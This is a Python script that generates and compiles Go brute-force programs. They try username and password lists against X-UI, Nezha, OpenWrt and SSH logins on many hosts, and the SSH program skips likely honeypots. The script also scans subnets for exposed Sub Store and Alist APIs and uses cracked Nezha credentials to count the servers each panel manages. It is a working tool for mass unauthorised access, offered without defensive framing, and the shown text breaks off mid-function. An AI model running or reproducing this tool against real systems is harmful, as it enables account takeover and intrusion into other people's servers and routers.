# -*- coding: utf-8 -*-
import os
import subprocess
import time
import shutil
import sys
import atexit
import re
import json
import base64
import binascii
import importlib.util
import uuid
import platform
from multiprocessing import Lock, Manager
from concurrent.futures import ProcessPoolExecutor, as_completed

# ==================== 依赖导入强化 (已修正) ====================
# 在脚本最开始就强制检查核心依赖，如果失败则直接退出
try:
    import psutil
    import requests
    import yaml
    import xlsxwriter
    from tqdm import tqdm
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError as e:
    # 在这里不能使用 Fore 或 Style，因为它们可能就是导入失败的对象
    print("❌ 错误：核心 Python 模块缺失！")
    print(f"缺失的模块是: {e.name}")
    print("请先手动安装所有依赖：")
    # 使用无颜色的 print
    print("python3 -m pip install psutil requests pyyaml xlsxwriter tqdm colorama --break-system-packages")
    sys.exit(1)

# 仅在非Windows系统上尝试导入
if platform.system() != "Windows":
    try:
        import resource
    except ImportError:
        resource = None
else:
    resource = None

try:
    import readline
except ImportError:
    pass
# =================================================

# ==================== 新增全局变量 ====================
TIMEOUT = 5
VERBOSE_DEBUG = False # 设置为True可以打印更详细的调试日志

# =========================== Go 模板 (已全面重构优化) ===========================
# 所有模板已切换到 fasthttp, stdin/stdout管道, channel+bufio.Writer, strings.Builder

# XUI/3x-ui 面板登录模板
XUI_GO_TEMPLATE_1_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"github.com/valyala/fasthttp\"",
    ")",
    "func worker(tasks <-chan string, wg *sync.WaitGroup, usernames []string, passwords []string, resultsChan chan<- string) {",
    "	defer wg.Done()",
    "	client := &fasthttp.Client{",
    "		TLSConfig: &tls.Config{InsecureSkipVerify: true},",
    "		NoDefaultUserAgentHeader: true,",
    "	}",
    "	for line := range tasks {",
    "		processIP(line, usernames, passwords, client, resultsChan)",
    "	}",
    "}",
    "func processIP(line string, usernames []string, passwords []string, client *fasthttp.Client, resultsChan chan<- string) {",
    "	ipPort := strings.TrimSpace(line)",
    "	if !strings.Contains(ipPort, \":\") { return }",
    "	var sb strings.Builder",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			sb.Reset()",
    "			sb.WriteString(\"username=\")",
    "			sb.WriteString(username)",
    "			sb.WriteString(\"&password=\")",
    "			sb.WriteString(password)",
    "			payload := sb.String()",
    "			if checkLogin(ipPort, payload, client, resultsChan) { return }",
    "		}",
    "	}",
    "}",
    "func checkLogin(ipPort, payload string, client *fasthttp.Client, resultsChan chan<- string) bool {",
    "	req := fasthttp.AcquireRequest()",
    "	resp := fasthttp.AcquireResponse()",
    "	defer fasthttp.ReleaseRequest(req)",
    "	defer fasthttp.ReleaseResponse(resp)",
    "	req.Header.SetMethod(\"POST\")",
    "	req.Header.SetContentType(\"application/x-www-form-urlencoded\")",
    "	req.Header.Set(\"User-Agent\", \"Mozilla/5.0\")",
    "	req.SetBodyString(payload)",
    "	timeoutDuration := {timeout} * time.Second",
    "	// 尝试 http",
    "	req.SetRequestURI(\"http://\" + ipPort + \"/login\")",
    "	if client.DoTimeout(req, resp, timeoutDuration) == nil && resp.StatusCode() == fasthttp.StatusOK {",
    "		if strings.Contains(string(resp.Body()), `\"success\":true`) {",
    "			parts := strings.SplitN(payload, \"&\", 2)",
    "			user := strings.SplitN(parts[0], \"=\", 2)[1]",
    "			pass := strings.SplitN(parts[1], \"=\", 2)[1]",
    "			resultsChan <- fmt.Sprintf(\"%s %s %s\", ipPort, user, pass)",
    "			return true",
    "		}",
    "	}",
    "	// 尝试 https",
    "	req.SetRequestURI(\"https://\" + ipPort + \"/login\")",
    "	if client.DoTimeout(req, resp, timeoutDuration) == nil && resp.StatusCode() == fasthttp.StatusOK {",
    "		if strings.Contains(string(resp.Body()), `\"success\":true`) {",
    "			parts := strings.SplitN(payload, \"&\", 2)",
    "			user := strings.SplitN(parts[0], \"=\", 2)[1]",
    "			pass := strings.SplitN(parts[1], \"=\", 2)[1]",
    "			resultsChan <- fmt.Sprintf(\"%s %s %s\", ipPort, user, pass)",
    "			return true",
    "		}",
    "	}",
    "	return false",
    "}",
    "func main() {",
    "	resultsChan := make(chan string, 1024)",
    "	var writerWg sync.WaitGroup",
    "	writerWg.Add(1)",
    "	go func() {",
    "		defer writerWg.Done()",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for result := range resultsChan {",
    "			writer.WriteString(result + \"\\n\")",
    "		}",
    "		writer.Flush()",
    "	}()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, &wg, usernames, passwords, resultsChan)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(resultsChan)",
    "	writerWg.Wait()",
    "}",
]

# 哪吒面板登录模板
XUI_GO_TEMPLATE_2_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"github.com/valyala/fasthttp\"",
    ")",
    "func worker(tasks <-chan string, wg *sync.WaitGroup, usernames []string, passwords []string, resultsChan chan<- string) {",
    "	defer wg.Done()",
    "	client := &fasthttp.Client{",
    "		TLSConfig: &tls.Config{InsecureSkipVerify: true},",
    "		NoDefaultUserAgentHeader: true,",
    "	}",
    "	for line := range tasks {",
    "		processIP(line, usernames, passwords, client, resultsChan)",
    "	}",
    "}",
    "func processIP(line string, usernames []string, passwords []string, client *fasthttp.Client, resultsChan chan<- string) {",
    "	ipPort := strings.TrimSpace(line)",
    "	if !strings.Contains(ipPort, \":\") { return }",
    "	var sb strings.Builder",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			sb.Reset()",
    "			sb.WriteString(`{\"username\":\"`)",
    "			sb.WriteString(username)",
    "			sb.WriteString(`\",\"password\":\"`)",
    "			sb.WriteString(password)",
    "			sb.WriteString(`\"}`)",
    "			payload := sb.String()",
    "			if checkLogin(ipPort, username, password, payload, client, resultsChan) { return }",
    "		}",
    "	}",
    "}",
    "func checkLogin(ipPort, username, password, payload string, client *fasthttp.Client, resultsChan chan<- string) bool {",
    "	req := fasthttp.AcquireRequest()",
    "	resp := fasthttp.AcquireResponse()",
    "	defer fasthttp.ReleaseRequest(req)",
    "	defer fasthttp.ReleaseResponse(resp)",
    "	req.Header.SetMethod(\"POST\")",
    "	req.Header.SetContentType(\"application/json\")",
    "	req.Header.Set(\"User-Agent\", \"Mozilla/5.0\")",
    "	req.SetBodyString(payload)",
    "	timeoutDuration := {timeout} * time.Second",
    "	// 尝试 http",
    "	req.SetRequestURI(\"http://\" + ipPort + \"/api/v1/login\")",
    "	if client.DoTimeout(req, resp, timeoutDuration) == nil && resp.StatusCode() == fasthttp.StatusOK {",
    "		if strings.Contains(string(resp.Body()), `\"token\":`) {",
    "			resultsChan <- fmt.Sprintf(\"%s %s %s\", ipPort, username, password)",
    "			return true",
    "		}",
    "	}",
    "	// 尝试 https",
    "	req.SetRequestURI(\"https://\" + ipPort + \"/api/v1/login\")",
    "	if client.DoTimeout(req, resp, timeoutDuration) == nil && resp.StatusCode() == fasthttp.StatusOK {",
    "		if strings.Contains(string(resp.Body()), `\"token\":`) {",
    "			resultsChan <- fmt.Sprintf(\"%s %s %s\", ipPort, username, password)",
    "			return true",
    "		}",
    "	}",
    "	return false",
    "}",
    "func main() {",
    "	resultsChan := make(chan string, 1024)",
    "	var writerWg sync.WaitGroup",
    "	writerWg.Add(1)",
    "	go func() {",
    "		defer writerWg.Done()",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for result := range resultsChan {",
    "			writer.WriteString(result + \"\\n\")",
    "		}",
    "		writer.Flush()",
    "	}()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, &wg, usernames, passwords, resultsChan)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(resultsChan)",
    "	writerWg.Wait()",
    "}",
]

# SSH 登录模板
XUI_GO_TEMPLATE_6_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"fmt\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"golang.org/x/crypto/ssh\"",
    ")",
    "func worker(tasks <-chan string, wg *sync.WaitGroup, usernames []string, passwords []string, resultsChan chan<- string) {",
    "	defer wg.Done()",
    "	for line := range tasks {",
    "		processIP(line, usernames, passwords, resultsChan)",
    "	}",
    "}",
    "func processIP(line string, usernames []string, passwords []string, resultsChan chan<- string) {",
    "	ipPort := strings.TrimSpace(line)",
    "	parts := strings.Split(ipPort, \":\")",
    "	if len(parts) != 2 { return }",
    "	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			config := &ssh.ClientConfig{",
    "				User:            username,",
    "				Auth:            []ssh.AuthMethod{ssh.Password(password)},",
    "				HostKeyCallback: ssh.InsecureIgnoreHostKey(),",
    "				Timeout:         {timeout} * time.Second,",
    "			}",
    "			client, err := ssh.Dial(\"tcp\", ipPort, config)",
    "			if err == nil {",
    "				if !isLikelyHoneypot(client) {",
    "					resultsChan <- fmt.Sprintf(\"%s:%s %s %s\", ip, port, username, password)",
    "				}",
    "				client.Close()",
    "				return",
    "			}",
    "		}",
    "	}",
    "}",
    "func isLikelyHoneypot(client *ssh.Client) bool {",
    "	session, err := client.NewSession()",
    "	if err != nil { return true }",
    "	defer session.Close()",
    "	err = session.RequestPty(\"xterm\", 80, 40, ssh.TerminalModes{})",
    "	if err != nil { return true }",
    "	output, err := session.CombinedOutput(\"echo $((1+1))\")",
    "	if err != nil { return true }",
    "	return strings.TrimSpace(string(output)) != \"2\"",
    "}",
    "func main() {",
    "	resultsChan := make(chan string, 1024)",
    "	var writerWg sync.WaitGroup",
    "	writerWg.Add(1)",
    "	go func() {",
    "		defer writerWg.Done()",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for result := range resultsChan {",
    "			writer.WriteString(result + \"\\n\")",
    "		}",
    "		writer.Flush()",
    "	}()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, &wg, usernames, passwords, resultsChan)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(resultsChan)",
    "	writerWg.Wait()",
    "}",
]

# Sub Store 路径扫描模板
XUI_GO_TEMPLATE_7_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"github.com/valyala/fasthttp\"",
    ")",
    "func worker(tasks <-chan string, wg *sync.WaitGroup, paths []string, resultsChan chan<- string) {",
    "	defer wg.Done()",
    "	client := &fasthttp.Client{",
    "		TLSConfig: &tls.Config{InsecureSkipVerify: true},",
    "		NoDefaultUserAgentHeader: true,",
    "	}",
    "	for line := range tasks {",
    "		processIP(line, paths, client, resultsChan)",
    "	}",
    "}",
    "func processIP(line string, paths []string, client *fasthttp.Client, resultsChan chan<- string) {",
    "	ipPort := strings.TrimSpace(line)",
    "	if !strings.Contains(ipPort, \":\") { return }",
    "	for _, path := range paths {",
    "		if tryPath(ipPort, path, client, resultsChan) { break }",
    "	}",
    "}",
    "func tryPath(ipPort, path string, client *fasthttp.Client, resultsChan chan<- string) bool {",
    "	cleanPath := strings.Trim(path, \"/\")",
    "	fullPath := cleanPath + \"/api/utils/env\"",
    "	timeoutDuration := {timeout} * time.Second",
    "	req := fasthttp.AcquireRequest()",
    "	resp := fasthttp.AcquireResponse()",
    "	defer fasthttp.ReleaseRequest(req)",
    "	defer fasthttp.ReleaseResponse(resp)",
    "	req.Header.Set(\"User-Agent\", \"Mozilla/5.0\")",
    "	// 尝试 http",
    "	httpURL := \"http://\" + ipPort + \"/\" + fullPath",
    "	req.SetRequestURI(httpURL)",
    "	if client.DoTimeout(req, resp, timeoutDuration) == nil && resp.StatusCode() == fasthttp.StatusOK {",
    "		if strings.Contains(string(resp.Body()), `{\"status\":\"success\",\"data\"`) {",
    "			resultsChan <- fmt.Sprintf(\"http://%s?api=http://%s/%s\", ipPort, ipPort, cleanPath)",
    "			return true",
    "		}",
    "	}",
    "	// 尝试 https",
    "	httpsURL := \"https://\" + ipPort + \"/\" + fullPath",
    "	req.SetRequestURI(httpsURL)",
    "	if client.DoTimeout(req, resp, timeoutDuration) == nil && resp.StatusCode() == fasthttp.StatusOK {",
    "		if strings.Contains(string(resp.Body()), `{\"status\":\"success\",\"data\"`) {",
    "			resultsChan <- fmt.Sprintf(\"https://%s?api=https://%s/%s\", ipPort, ipPort, cleanPath)",
    "			return true",
    "		}",
    "	}",
    "	return false",
    "}",
    "func main() {",
    "	resultsChan := make(chan string, 1024)",
    "	var writerWg sync.WaitGroup",
    "	writerWg.Add(1)",
    "	go func() {",
    "		defer writerWg.Done()",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for result := range resultsChan {",
    "			writer.WriteString(result + \"\\n\")",
    "		}",
    "		writer.Flush()",
    "	}()",
    "	paths := {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, &wg, paths, resultsChan)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(resultsChan)",
    "	writerWg.Wait()",
    "}",
]

# OpenWrt/iStoreOS 登录模板
XUI_GO_TEMPLATE_8_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"github.com/valyala/fasthttp\"",
    ")",
    "func worker(tasks <-chan string, wg *sync.WaitGroup, usernames []string, passwords []string, resultsChan chan<- string) {",
    "	defer wg.Done()",
    "	client := &fasthttp.Client{",
    "		TLSConfig: &tls.Config{InsecureSkipVerify: true},",
    "		NoDefaultUserAgentHeader: true,",
    "	}",
    "	for line := range tasks {",
    "		processIP(line, usernames, passwords, client, resultsChan)",
    "	}",
    "}",
    "func processIP(line string, usernames []string, passwords []string, client *fasthttp.Client, resultsChan chan<- string) {",
    "	ipPort := strings.TrimSpace(line)",
    "	if !strings.Contains(ipPort, \":\") { return }",
    "	var sb strings.Builder",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			sb.Reset()",
    "			sb.WriteString(\"luci_username=\")",
    "			sb.WriteString(username)",
    "			sb.WriteString(\"&luci_password=\")",
    "			sb.WriteString(password)",
    "			payload := sb.String()",
    "			if checkLogin(\"http://\"+ipPort, username, password, payload, client, resultsChan) { return }",
    "			if checkLogin(\"https://\"+ipPort, username, password, payload, client, resultsChan) { return }",
    "		}",
    "	}",
    "}",
    "func checkLogin(baseURL, username, password, payload string, client *fasthttp.Client, resultsChan chan<- string) bool {",
    "	req := fasthttp.AcquireRequest()",
    "	resp := fasthttp.AcquireResponse()",
    "	defer fasthttp.ReleaseRequest(req)",
    "	defer fasthttp.ReleaseResponse(resp)",
    "	req.SetRequestURI(baseURL)",
    "	req.Header.SetMethod(\"POST\")",
    "	req.Header.SetContentType(\"application/x-www-form-urlencoded\")",
    "	req.Header.Set(\"User-Agent\", \"Mozilla/5.0\")",
    "	req.Header.Set(\"Referer\", baseURL+\"/\")",
    "	req.SetBodyString(payload)",
    "	if client.DoTimeout(req, resp, {timeout}*time.Second) != nil { return false }",
    "	var foundCookie bool",
    "	resp.Header.VisitAllCookie(func(key, value []byte) {",
    "		if string(key) == \"sysauth_http\" && len(value) > 0 {",
    "			foundCookie = true",
    "		}",
    "	})",
    "	if foundCookie {",
    "		resultsChan <- fmt.Sprintf(\"%s %s %s\", baseURL, username, password)",
    "		return true",
    "	}",
    "	return false",
    "}",
    "func main() {",
    "	resultsChan := make(chan string, 1024)",
    "	var writerWg sync.WaitGroup",
    "	writerWg.Add(1)",
    "	go func() {",
    "		defer writerWg.Done()",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for result := range resultsChan {",
    "			writer.WriteString(result + \"\\n\")",
    "		}",
    "		writer.Flush()",
    "	}()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, &wg, usernames, passwords, resultsChan)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(resultsChan)",
    "	writerWg.Wait()",
    "}",
]

# Alist 面板扫描模板
ALIST_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"github.com/valyala/fasthttp\"",
    ")",
    "func worker(tasks <-chan string, wg *sync.WaitGroup, resultsChan chan<- string) {",
    "	defer wg.Done()",
    "	client := &fasthttp.Client{",
    "		TLSConfig: &tls.Config{InsecureSkipVerify: true},",
    "		NoDefaultUserAgentHeader: true,",
    "	}",
    "	for ipPort := range tasks {",
    "		processIP(ipPort, client, resultsChan)",
    "	}",
    "}",
    "func processIP(ipPort string, client *fasthttp.Client, resultsChan chan<- string) {",
    "	if !strings.Contains(ipPort, \":\") { return }",
    "	for _, proto := range []string{\"http\", \"https\"} {",
    "		url := fmt.Sprintf(\"%s://%s/api/me\", proto, ipPort)",
    "		req := fasthttp.AcquireRequest()",
    "		resp := fasthttp.AcquireResponse()",
    "		req.SetRequestURI(url)",
    "		req.Header.Set(\"User-Agent\", \"Mozilla/5.0\")",
    "		err := client.DoTimeout(req, resp, {timeout}*time.Second)",
    "		if err == nil && resp.StatusCode() == fasthttp.StatusOK {",
    "			body := string(resp.Body())",
    "			if strings.Contains(body, `\"code\":200`) {",
    "				resultsChan <- fmt.Sprintf(\"%s://%s\", proto, ipPort)",
    "				fasthttp.ReleaseRequest(req)",
    "				fasthttp.ReleaseResponse(resp)",
    "				return",
    "			}",
    "		}",
    "		fasthttp.ReleaseRequest(req)",
    "		fasthttp.ReleaseResponse(resp)",
    "	}",
    "}",
    "func main() {",
    "	resultsChan := make(chan string, 1024)",
    "	var writerWg sync.WaitGroup",
    "	writerWg.Add(1)",
    "	go func() {",
    "		defer writerWg.Done()",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for result := range resultsChan {",
    "			writer.WriteString(result + \"\\n\")",
    "		}",
    "		writer.Flush()",
    "	}()",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, &wg, resultsChan)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" {",
    "			fields := strings.Fields(line)",
    "			if len(fields) > 0 { tasks <- fields[0] }",
    "		}",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(resultsChan)",
    "	writerWg.Wait()",
    "}",
]

# TCP 端口活性测试模板
TCP_ACTIVE_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"net\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func worker(tasks <-chan string, wg *sync.WaitGroup, resultsChan chan<- string) {",
    "	defer wg.Done()",
    "	for ipPort := range tasks {",
    "		conn, err := net.DialTimeout(\"tcp\", strings.TrimSpace(ipPort), {timeout}*time.Second)",
    "		if err == nil {",
    "			conn.Close()",
    "			resultsChan <- ipPort",
    "		}",
    "	}",
    "}",
    "func main() {",
    "	resultsChan := make(chan string, 1024)",
    "	var writerWg sync.WaitGroup",
    "	writerWg.Add(1)",
    "	go func() {",
    "		defer writerWg.Done()",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for result := range resultsChan {",
    "			writer.WriteString(result + \"\\n\")",
    "		}",
    "		writer.Flush()",
    "	}()",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, &wg, resultsChan)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(resultsChan)",
    "	writerWg.Wait()",
    "}",
]

# 子网TCP扫描模板
SUBNET_TCP_SCANNER_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"fmt\"",
    "	\"net\"",
    "	\"os\"",
    "	\"strconv\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func inc(ip net.IP) {",
    "	for j := len(ip) - 1; j >= 0; j-- {",
    "		ip[j]++",
    "		if ip[j] > 0 { break }",
    "	}",
    "}",
    "func worker(tasks <-chan net.IP, port string, wg *sync.WaitGroup, resultsChan chan<- string) {",
    "	defer wg.Done()",
    "	timeout := 3 * time.Second",
    "	for ip := range tasks {",
    "		target := net.JoinHostPort(ip.String(), port)",
    "		conn, err := net.DialTimeout(\"tcp\", target, timeout)",
    "		if err == nil {",
    "			conn.Close()",
    "			resultsChan <- target",
    "		}",
    "	}",
    "}",
    "func main() {",
    "	if len(os.Args) < 4 { os.Exit(1) }",
    "	cidr, port, concurrencyStr := os.Args[1], os.Args[2], os.Args[3]",
    "	concurrency, _ := strconv.Atoi(concurrencyStr)",
    "	resultsChan := make(chan string, 1024)",
    "	var writerWg sync.WaitGroup",
    "	writerWg.Add(1)",
    "	go func() {",
    "		defer writerWg.Done()",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for result := range resultsChan {",
    "			writer.WriteString(result + \"\\n\")",
    "		}",
    "		writer.Flush()",
    "	}()",
    "	ip, ipnet, err := net.ParseCIDR(cidr)",
    "	if err != nil { os.Exit(1) }",
    "	tasks := make(chan net.IP, concurrency)",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < concurrency; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, port, &wg, resultsChan)",
    "	}",
    "	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {",
    "		ipCopy := make(net.IP, len(ip))",
    "		copy(ipCopy, ip)",
    "		tasks <- ipCopy",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(resultsChan)",
    "	writerWg.Wait()",
    "}",
]

# =========================== 哪吒面板分析函数 ===========================
def analyze_panel(result_line):
    parts = result_line.split()
    if len(parts) < 3: return result_line, (0, 0, "格式错误")
    ip_port, username, password = parts[0], parts[1], parts[2]
    for protocol in ["http", "https"]:
        base_url = f"{protocol}://{ip_port}"
        session = requests.Session()
        login_url = f"{base_url}/api/v1/login"
        payload = {"username": username, "password": password}
        try:
            requests.packages.urllib3.disable_warnings()
            res = session.post(login_url, json=payload, timeout=TIMEOUT, verify=False)
            if res.status_code == 200:
                try:
                    j = res.json()
                    if "token" in j.get("data", {}):
                        session.headers.update({"Authorization": f"Bearer {j['data']['token']}"})
                        res_server = session.get(f"{base_url}/api/v1/server", timeout=TIMEOUT, verify=False)
                        if res_server.status_code == 200:
                            server_data = res_server.json().get("data", [])
                            machine_count = len(server_data) if server_data else 0
                            return result_line, (machine_count, "N/A", "N/A") # 简化分析，不再检查终端
                except (json.JSONDecodeError, requests.RequestException):
                    continue
        except requests.exceptions.RequestException:
            continue
    return result_line, (0, 0, "登录或分析失败")

# =========================== 主脚本优化部分 ===========================
GO_EXEC = "/usr/local/go/bin/go"

def input_with_default(prompt, default):
    user_input = input(f"{prompt} (默认: {default})：").strip()
    return int(user_input) if user_input.isdigit() else default

def input_filename_with_default(prompt, default):
    user_input = input(f"{prompt} (默认: {default})：").strip()
    return user_input if user_input else default

def escape_go_string(s: str) -> str:
    return s.replace("\\", "\\\\").replace('"', '\\"')

def generate_go_code(go_file_name, template_lines, **kwargs):
    code = "\n".join(template_lines)
    kwargs.setdefault('timeout', 3)
    kwargs.setdefault('semaphore_size', 100)

    for key, value in kwargs.items():
        placeholder = f"{{{key}}}"
        if placeholder in code:
            code = code.replace(placeholder, str(value))

    if '{user_list}' in code:
        user_list_str = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in kwargs.get('usernames', [])]) + "}"
        code = code.replace("{user_list}", user_list_str)
    if '{pass_list}' in code:
        pass_list_str = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in kwargs.get('passwords', [])]) + "}"
        code = code.replace("{pass_list}", pass_list_str)

    with open(go_file_name, 'w', encoding='utf-8') as f:
        f.write(code)

def compile_go_program(go_file, executable_name):
    executable_path = os.path.abspath(executable_name)
    if sys.platform == "win32":
        executable_path += ".exe"

    print(f"📦 [编译] 正在编译Go程序 {go_file} -> {executable_path}...")
    go_env = os.environ.copy()
    go_env['GOGC'] = '500' # Use more memory for less GC pauses
    go_env['GOPATH'] = os.path.expanduser('~/go')
    if 'HOME' not in go_env: go_env['HOME'] = '/tmp'
    if 'GOCACHE' not in go_env: go_env['GOCACHE'] = '/tmp/.cache/go-build'

    try:
        cmd = [GO_EXEC, 'build', '-ldflags', '-s -w', '-o', executable_path, go_file]
        result = subprocess.run(cmd, capture_output=True, text=True, check=True, env=go_env)
        if result.stderr:
            print(f"   - ⚠️  {Fore.YELLOW}Go编译器警告: {result.stderr}{Style.RESET_ALL}")
        print(f"✅ [编译] Go程序编译成功: {executable_path}")
        return executable_path
    except subprocess.CalledProcessError as e:
        print(f"❌ {Fore.RED}[编译] Go程序 {go_file} 编译失败!{Style.RESET_ALL}")
        print(f"   - 返回码: {e.returncode}")
        print(f"   - 错误输出:\n{e.stderr}")
        print("   - 请检查Go环境和代码。")
        return None

def tune_system():
    if platform.system() == "Linux":
        print("🐧 [系统] 正在尝试进行Linux系统优化...")
        if resource:
            try:
                soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
                if soft < 65536:
                    resource.setrlimit(resource.RLIMIT_NOFILE, (65536, 65536))
                    print(f"✅ [系统] 文件描述符限制已提升至 65536。")
            except (ValueError, OSError) as e:
                print(f"⚠️  {Fore.YELLOW}[系统] 提升文件描述符限制失败: {e}。建议使用root权限运行。{Style.RESET_ALL}")
        print(f"ℹ️  {Fore.CYAN}[系统] 为获得最佳性能，建议以root身份运行以下命令: {Style.RESET_ALL}")
        print(f"{Fore.YELLOW}sysctl -w net.core.somaxconn=65535")
        print(f"sysctl -w net.ipv4.tcp_tw_reuse=1")
        print(f"sysctl -w net.ipv4.tcp_fin_timeout=30{Style.RESET_ALL}")

# ==================== 全新执行模型 (管道/多进程) ====================
def process_chunk(executable_path, lines, go_timeout):
    input_data = "\n".join(lines).encode('utf-8')
    total_timeout = (go_timeout * len(lines)) + 60

    try:
        proc = subprocess.run(
            [executable_path],
            input=input_data,
            capture_output=True,
            timeout=total_timeout,
            check=False
        )
        if proc.returncode != 0:
            if proc.returncode == 137:
                 return (False, f"Go进程被系统终止(OOM Killed)。错误: {proc.stderr.decode('utf-8', 'ignore')}")
            return (False, f"Go进程异常退出，返回码 {proc.returncode}。错误: {proc.stderr.decode('utf-8', 'ignore')}")

        results = proc.stdout.decode('utf-8', 'ignore').strip().split('\n')
        return (True, [res for res in results if res])
    except subprocess.TimeoutExpired:
        return (False, "任务块处理超时，已被强制终止。")
    except Exception as e:
        return (False, f"执行任务块时发生未知Python异常: {e}")

def run_scan_in_parallel(lines, executable_path, python_concurrency, go_internal_concurrency, chunk_size, go_timeout, final_output_file):
    if not lines: return
    chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
    print(f"ℹ️  [扫描] 已将 {len(lines)} 个目标分为 {len(chunks)} 个任务块。")

    manager = Manager()
    lock = manager.Lock()

    with ProcessPoolExecutor(max_workers=python_concurrency) as executor:
        futures = [executor.submit(process_chunk, executable_path, chunk, go_timeout) for chunk in chunks]
        with tqdm(total=len(chunks), desc=f"⚙️  [扫描] 并行处理中", ncols=100) as pbar:
            for future in as_completed(futures):
                try:
                    success, data = future.result()
                    if success and data:
                        with lock:
                            with open(final_output_file, 'a', encoding='utf-8') as f:
                                for line in data:
                                    f.write(line + '\n')
                    elif not success:
